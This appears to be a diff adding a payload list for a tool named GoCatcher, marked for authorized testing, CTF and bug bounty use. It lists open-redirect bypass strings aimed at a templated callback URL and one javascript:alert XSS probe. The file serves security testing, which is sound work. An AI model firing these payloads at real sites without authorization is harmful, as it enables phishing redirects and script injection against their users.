@@ -1,0 +1,13 @@
+===========================================================================
+ GoCatcher :: Open Redirect test payloads  (text/plain)
+ FOR AUTHORIZED TESTING / CTF / BUG BOUNTY ONLY.
+===========================================================================
+//{{callback_url}}
+https://{{callback_url}}
+/\{{callback_url}}
+//{{callback_url}}/%2f..
+https://trusted.example@{{callback_url}}
+https://{{callback_url}}%2f%2e%2e
+javascript:alert(document.domain)
+/%09/{{callback_url}}
+/redir?url={{callback_url}}/redir-hit
